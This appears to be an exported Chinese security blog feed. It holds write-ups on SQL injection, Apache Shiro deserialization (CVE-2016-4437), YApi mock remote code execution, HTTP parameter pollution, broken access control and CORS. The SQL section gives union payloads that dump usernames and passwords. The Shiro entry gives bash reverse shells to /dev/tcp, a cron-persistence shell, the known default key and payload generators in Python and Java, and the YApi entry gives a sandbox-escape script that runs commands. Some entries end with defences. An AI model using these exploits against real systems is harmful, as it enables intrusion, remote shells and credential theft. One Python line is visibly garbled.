<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//判断MySQL数据库</span><br><span class="line">xxx?id=1 and exists(select * from information_schema.tables) --+</span><br><span class="line"> </span><br><span class="line">//判断Access数据库 </span><br><span class="line">xxx?id=1 and exists(select * from msysobjects) --+</span><br><span class="line"></span><br><span class="line">//判断Mssql数据库</span><br><span class="line">xxx?id=1 and exists(select * from sysobjects) --+</span><br><span class="line"> </span><br><span class="line">//判断Oracle数据库</span><br><span class="line">xxx?id=1 and (select count(*) from dual)&gt;0 --+</span><br></pre></td></tr></table></figure>



<h2 id="Union联合查询注入"><a href="#Union联合查询注入" class="headerlink" title="Union联合查询注入"></a>Union联合查询注入</h2><h3 id="判断闭合符号"><a href="#判断闭合符号" class="headerlink" title="判断闭合符号"></a>判断闭合符号</h3><p>当我们找到一个注入点时，首先判断该注入点中可能存在的闭合符号</p>
<p>无闭合，单引号<code>&#39;&#39;</code>,双引号<code>&quot;&quot;</code>,括号<code>()</code>,单引号+括号<code>(&#39;&#39;)</code>,双引号+括号<code>(&quot;&quot;)</code>….以及<code>引号+多括号</code>组合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx?id = -1</span><br><span class="line">如果报错说明可能存在注入</span><br><span class="line"></span><br><span class="line">xxx?id = 1 and 1 = 2 --+</span><br><span class="line">如果不报错，说明不是数字型注入</span><br><span class="line"></span><br><span class="line">xxx?id = 1’ and 1 = 2 --+</span><br><span class="line">如果报错，说明闭合含有单引号，如果不报错，说明闭合含有双引号</span><br><span class="line">然后通过构造语句能否成功执行判断具体的闭合组合情况</span><br></pre></td></tr></table></figure>



<h3 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx?id = 1&#x27; order by 5 --+</span><br></pre></td></tr></table></figure>

<p>通过语句<code>order by x</code>来判断字段的数量</p>
<p>如果不报错，说明字段数量大于等于5，如果报错，说明字段数量小于5</p>
<h3 id="判断数据显示位置"><a href="#判断数据显示位置" class="headerlink" title="判断数据显示位置"></a>判断数据显示位置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx?id = -1&#x27; union select 1,2,3,4... --+ </span><br></pre></td></tr></table></figure>

<p>这里先通过负号<code>-</code>或者<code>and 1 = 2</code>使得数据库报错</p>
<p>再通过<code>union</code>建立联合查询，也就是在<code>select</code>查询里面再嵌套一个查询语句</p>
<p>后面的数值排列取决于判断的字段数量</p>
<p>若回显中出现了相应的数值说明我们接下来查询的信息会在该位置显示</p>
<p>如图下的2和3可能会在网页中显现出来</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqxkgro2qj60o804iabv02.jpg" alt="SQL注入1.png"></p>
<h3 id="查询数据库库名"><a href="#查询数据库库名" class="headerlink" title="查询数据库库名"></a>查询数据库库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx?id = -1&#x27; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>

<p><code>database()</code>是MySQL中的一个函数，表示当前数据库的名字</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqxw3ux3yj60ps04ggnl02.jpg" alt="SQL注入2.png"></p>
<h3 id="枚举数据库中的所有的表"><a href="#枚举数据库中的所有的表" class="headerlink" title="枚举数据库中的所有的表"></a>枚举数据库中的所有的表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx?id = -1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() --+</span><br></pre></td></tr></table></figure>

<p>这个语句的意思是从<code>information_schema</code>的<code>table-schema</code>表中查找当前数据库的所有表</p>
<p><code>information_schema</code>：MySQL的默认数据库，包含了所有数据库，数据表的信息</p>
<p><code>table_schema</code>：默认数据库中的一个表，记录了数据库名字</p>
<p><code>table_name</code>：默认数据库中的一个表，记录了数据表的名字</p>
<p><code>group_concat()</code>：是MySQL的函数，把函数中字段的值输出在一行中，以逗号分隔</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqyv8akyuj60xj04qgp102.jpg" alt="SQL注入3.png"></p>
<h3 id="枚举数据表中所有的字段"><a href="#枚举数据表中所有的字段" class="headerlink" title="枚举数据表中所有的字段"></a>枚举数据表中所有的字段</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx?id = -1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = databese() and table_name = &#x27;user&#x27; --+</span><br></pre></td></tr></table></figure>

<p>这个语句的意思是从<code>information_schema</code>中条件为当前数据表并且当前数据库中的<code>user</code>表中所有字段的名字</p>
<p><code>column_name</code>：MySQL的默认数据库中的一个表，记录了字段的名字</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsqyvpxte8j60xg04qq6p02.jpg" alt="SQL注入4.png"></p>
<h3 id="查询字段中所有的值"><a href="#查询字段中所有的值" class="headerlink" title="查询字段中所有的值"></a>查询字段中所有的值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx?id = -1&#x27; union select 1,group_concat(concat_ws(0x2d,username,password)),3 from user --+</span><br></pre></td></tr></table></figure>

<p>这个语句的意思是查询<code>user</code>表中<code>username</code>字段和<code>password</code>的值</p>
<p><code>concat_ws</code>：MySQL的函数，为了格式化数据，看起来整齐，通过第一个参数连接后面所有参数</p>
<p><code>0x2d</code>：ASCII码，代表<code>-</code></p>
<p>最后输出格式为<code>user1-pass1</code>,<code>user2-pass2</code>…..</p>
<h2 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h2><p>盲注，通常是在服务器没有回显错误信息，所以攻击者找到验证注入的SQL语句是否执行的方法</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>注入漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro反序列化 - shiro 550 - CVE-2016-4437</title>
    <url>//3609c62142b6.html</url>
    <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>​        Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。</p>
<p>​        Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>
<p><strong>shiro反序列化流程</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">序列化--&gt;AES加密--&gt;base64--&gt;编码--&gt;发送cookie</span><br></pre></td></tr></table></figure>



<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。<br>在服务端接收cookie值时，按照如下步骤来解析处理：</p>
<ul>
<li><p>  检索RememberMe cookie 的值</p>
</li>
<li><p>  Base 64解码</p>
</li>
<li><p>  使用AES解密(加密密钥硬编码)</p>
</li>
<li><p>  进行反序列化操作（未作过滤处理）</p>
</li>
</ul>
<p>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p>
<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>Shrio框架的特征是登录页面的cookie中存在remeberMe=deleteMe的内容。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>Apache Shiro &lt; 1.2.4</li>
</ul>
<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>  只要rememberMe的AES加密密钥泄漏，无论shiro什么版本都会导致反序列化漏洞。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们可以通过工具来检查key是否泄露</p>
<blockquote>
<p>  Shiro_Attack</p>
<p>  <a href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a></p>
<p>  ShiroExploit</p>
<p>  <a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p>
<p>  反序列化利用链</p>
<p>  ysoserial</p>
<p>  <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
</blockquote>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>本地监听端口</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nc <span class="literal">-lvnp</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p>对反弹shell命令生成bash格式编码</p>
<blockquote>
<p>  <a href="https://www.jackson-t.ca/runtime-exec-payloads.html">https://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.1/8888 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<p>通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">java <span class="literal">-cp</span> ysoserial<span class="literal">-0</span>.<span class="number">0.6</span><span class="literal">-SNAPSHOT</span><span class="literal">-all</span>.jar ysoserial.exploit.JRMPListener <span class="number">6666</span> CommonsCollections4 <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>生成payload</p>
<blockquote>
<p>  192.168.1.1:6666</p>
</blockquote>
<p>利用 python 代码和 ysoserial 生成 payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    <span class="comment"># 这里使用 ysoserial 的 CommonsBeanutils1 模块</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;CommonsBeanutils1&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 明文需要按一定长度对齐，叫做块大小BlockSize 这个块大小是 block_size = 16 字节</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 按照加密规则按一定长度对齐,如果不够要要做填充对齐</span></span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 泄露的key</span></span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># AES的CBC加密模式</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用uuid4基于随机数模块生成16字节的 iv向量</span></span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实例化一个加密方式为上述的对象</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用pad函数去处理yso的命令输出，生成的序列化数据</span></span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># iv 与 （序列化的AES加密后的数据）拼接， 最终输出生成rememberMe参数</span></span><br><span class="line">    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64_rememberMe_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(<span class="string">&#x27;w&#x27;</span>ho<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    print(&quot;rememberMe=&#123;&#125;&quot;.format(payload.decode()))</span></span><br></pre></td></tr></table></figure>

<p>命令写入文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;\n\n/* * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.1/8888 0&gt;&amp;1\n\n&quot; &gt; /var/spool/cron/crontabs</span><br></pre></td></tr></table></figure>



<h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p>把命令写入文件中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>

<p>生成payload</p>
<p>利用Java代码生成payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRemember</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;d://poc.ser&quot;</span>));</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把生成的值贴入rememberMe Cookie，即可成功执行命令</p>
<h3 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h3><p>如果攻击没有生效，尝试删除Cookie中的Jsessionid字段，防止服务端不去处理cookie</p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>设置为获得随机key</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>Apache</category>
        <category>反序列化漏洞</category>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Yapi Mock远程代码执行漏洞</title>
    <url>//6fa5989b4cf9.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://github.com/YMFE/yapi">Yapi</a> 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。</p>
<p>YApi接口管理平台远程代码执行0day漏洞，攻击者可通过平台注册用户添加接口，设置mock脚本从而执行任意代码。鉴于该漏洞目前处于0day漏洞利用状态，强烈建议客户尽快采取缓解措施以避免受此漏洞影响</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Yapi &lt;= 1.9.2</p>
<h2 id="FOFA搜索指纹"><a href="#FOFA搜索指纹" class="headerlink" title="FOFA搜索指纹"></a>FOFA搜索指纹</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fofa:app=&quot;YApi&quot;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该平台默认开启注册功能，直接注册登录即可</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7rc5vdij60lp0lp41g02.jpg" alt="yapi远程代码执行漏洞1.png"></p>
<p>注册之后新建项目</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7tbt2z8j60xb0fs0su02.jpg" alt="yapi远程代码执行漏洞2.png"></p>
<p>添加接口</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7u3psyvj614u0cdmxo02.jpg" alt="yapi远程代码执行漏洞3.png"></p>
<p>选择高级mock-脚本-开启脚本</p>
<p>把以下代码粘贴到脚本中</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami &amp;&amp; ps -ef&quot;</span>).toString()</span><br></pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7zvi0rdj613f0cggm202.jpg" alt="yapi远程代码执行漏洞4.png"></p>
<p>保存代码并预览</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg80lszuwj60my05njra02.jpg" alt="yapi远程代码执行漏洞5.png"></p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1.Yapi作者已经停止更新，建议禁止用户注册。通过修改 Yapi 项目目录下的 config.json 文件，将 closeRegister 字段修改为 true 并重启服务即可。</p>
<p>2.升级维护版本（非官方）</p>
<p><a href="https://github.com/yapi-pro/yapi">https://github.com/yapi-pro/yapi</a></p>
<p>3.如果没有 Mock 功能的需求，建议关闭 Yapi 的 Mock 功能</p>
<p>4.在 Mock 功能中加入对恶意代码的过滤。找到文件 <code>api/common/postmanLib.js</code> 的第178行，在函数 <code>function sandboxByNode(sandbox = &#123;&#125;, script)</code> 的开始添加一段过滤： <code>const filter = &#39;process|exec|require&#39;; const reg = new RegExp(&quot;[&quot;+filter+&quot;]&quot;, &quot;g&quot;); if(reg.test(script)) &#123; return false; &#125;</code></p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web应用漏洞</category>
        <category>Yapi</category>
      </categories>
      <tags>
        <tag>远程代码执行漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>HPP参数污染漏洞</title>
    <url>//4189faf9a367.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>浏览器在跟服务器进行交互的过程中，浏览器往往会在GET/POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="https://www.baidu.com/s?wd=aa&amp;wd=bb">https://www.baidu.com/s?wd=aa&amp;wd=bb</a> ，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是wd=aa。有的服务器是取第二个参数，也就是wd=bb。有的服务器两个参数都取，也就是wd=aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p>
<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>以百度为例，当我们提交两个或两个以上的参数时，返回第一个参数的结果</p>
<p><a href="https://www.baidu.com/s?wd=1&amp;wd=2">https://www.baidu.com/s?wd=1&amp;wd=2</a></p>
<p>以必应为例，当我们提交两个或两个以上的参数时，返回第最后一个参数的结果</p>
<p><a href="https://cn.bing.com/search?q=1&amp;q=2">https://cn.bing.com/search?q=1&amp;q=2</a></p>
<p>以Google为例，当我们提交两个或两个以上的参数时，返回全部参数的结果，参数之间以空格相隔</p>
<p><a href="https://www.google.com.hk/search?q=1&amp;q=2">https://www.google.com.hk/search?q=1&amp;q=2</a></p>
<table>
<thead>
<tr>
<th align="center">web服务器</th>
<th align="center">获取参数函数</th>
<th align="center">获取到的参数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">PHP/Apache</td>
<td align="center">$_GET(“test”)</td>
<td align="center">last</td>
</tr>
<tr>
<td align="center">JSP/Tomcat</td>
<td align="center">Request.getParameter(“test”)</td>
<td align="center">first</td>
</tr>
<tr>
<td align="center">Perl(CGI)/Apache</td>
<td align="center">Param(“test”)</td>
<td align="center">first</td>
</tr>
<tr>
<td align="center">Python/Apache</td>
<td align="center">getvalue(“test”)</td>
<td align="center">ALL</td>
</tr>
<tr>
<td align="center">ASP/IIS</td>
<td align="center">Request.QueryString(“test”)</td>
<td align="center">ALL</td>
</tr>
</tbody></table>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞可以用于逻辑漏洞，可以造成IDOR，信息泄露，越权等漏洞</p>
<p>该漏洞是注入型漏洞，可以作为其他漏洞的辅助，也可以用于绕过漏洞的检测和WAF等</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>HPP</category>
      </categories>
      <tags>
        <tag>访问控制错误漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>越权漏洞</title>
    <url>//7e65569ca276.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>越权访问（Broken Access Control，简称BAC）是未必应用程序中一种常见的漏洞，范围广，危害大。</p>
<p>该漏洞是指应用在检查授权时存在纰漏，使得攻击者在活动地权限账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。越权漏洞的成因主要是因为开发人员在对数据进行增，删，改，查询时对客户端请求的数据过分相信而遗漏了权限的判定，一旦权限验证不充分，就容易导致越权漏洞</p>
<p>靶场：<a href="http://www.wbug.org:9003/">http://www.wbug.org:9003/</a></p>
<h3 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h3><p>越权访问漏洞主要分为水平越权，垂直越权</p>
<p><strong>水平越权</strong>：指攻击者尝试访问与他拥有相同权限的用户资源。例如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的这种行为就叫做水平越权访问。</p>
<p><strong>垂直越权</strong>：由于后台应用没有做权限控制，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。比如用户A与用户B是处于两个不等的等级，低等级用户获取到了高等级用户权限，这种称之为垂直越权漏洞</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li>越权访问漏洞最基础的是ID</li>
<li>发生越权访问的前提是两个用户处于同一张数据表内</li>
</ul>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h3><p>通常情况下，一个web程序的功能流程是登录-提交请求-验证权限-数据库查询-返回结果。</p>
<p>如果权限验证不足，就会导致越权。常见的程序通常会认为通过登录之后即可验证用户的身份，从而不会去做下一步的验证，最后导致越权。</p>
<h3 id="越权行为"><a href="#越权行为" class="headerlink" title="越权行为"></a>越权行为</h3><h4 id="通过隐藏URL"><a href="#通过隐藏URL" class="headerlink" title="通过隐藏URL"></a>通过隐藏URL</h4><p>实现控制访问有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但 URL 泄露或被恶意攻击者猜到后，这会导致越权攻击。</p>
<h4 id="直接对象引用"><a href="#直接对象引用" class="headerlink" title="直接对象引用"></a>直接对象引用</h4><p>这种通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水平越权。</p>
<h4 id="多阶段功能"><a href="#多阶段功能" class="headerlink" title="多阶段功能"></a>多阶段功能</h4><p>多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。当验证成功后，跳到第二步，输入新密码，很多程序会在这一步不再验证用户身份，导致恶意攻击者抓包直接修改参数值，导致可修改任意用户密码。</p>
<h4 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h4><p>很多网站的下载功能，一些被下载的静态文件，例如 pdf、word、xls 等，可能只有付费用户或会员可下载，但当这些文件的 URL 地址泄露后，导致任何人可下载，如果知道 URL 命名规则，则会便利服务器的收费文档进行批量下载。</p>
<h4 id="平台配置错误"><a href="#平台配置错误" class="headerlink" title="平台配置错误"></a>平台配置错误</h4><p>一些程序会通过控件来限制用户的访问，例如后台地址，普通用户不属于管理员组，则不能访问。但当配置平台或配置控件错误时，就会出现越权访问。</p>
<h3 id="cookie越权"><a href="#cookie越权" class="headerlink" title="cookie越权"></a>cookie越权</h3><ul>
<li>平行越权<ul>
<li>userid<ul>
<li>1</li>
<li>2</li>
</ul>
</li>
<li>username<ul>
<li>zhangsan</li>
<li>wangwu</li>
</ul>
</li>
</ul>
</li>
<li>垂直越权<ul>
<li>nember_type<ul>
<li>user</li>
<li>admin</li>
<li>root</li>
<li>manager</li>
<li>system</li>
</ul>
</li>
<li>user_type<ul>
<li>0</li>
<li>1</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>当我们找到一些关键参数，如id,user_id,pid等，关注每一个可能决定用户权限的参数值，通过加减1提交整数值，查看是否显示超出权限的数据，如参数不是数字，则查找相关权限词组，比如把user改成admin，查看是否显示超出权限的数据。</p>
<h3 id="ID类型"><a href="#ID类型" class="headerlink" title="ID类型"></a>ID类型</h3><p>常规类型：1，2，3，4，5…..</p>
<p>加密类型：如MD5加密</p>
<p>加码类型：如base64</p>
<p>随机类型：字母+数字</p>
<p>可推理类型：如日期+序号</p>
<h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>1、前后端同时对用户输入信息进行校验，双重验证机制</p>
<p>2、 执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限</p>
<p>3、特别敏感操作可以让用户再次输入密码或其他的验证信息。</p>
<p>4、可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session、cookie 中加入不可预测、不可猜解的 user 信息。</p>
<p>5、直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理</p>
<p>6、永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>越权漏洞</category>
      </categories>
      <tags>
        <tag>越权漏洞</tag>
        <tag>逻辑漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>CORS（跨域资源共享）配置不当</title>
    <url>//d1ef1b19c260.html</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer" />

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> 　　同源策略（SOP）限制了网络应用之间的信息共享，仅允许同域内进行数据共享。这是很久以前就定下的浏览器安全防护措施。但是，随着网络世界的快速发展，在很多应用场景下，我们都需要将信息从一个子域传递到另一个子域，又或者需要在不同域之间传递数据。这其中可能涉及非常敏感且重要的功能，例如将访问令牌和session标识符传递给另一个应用。</p>
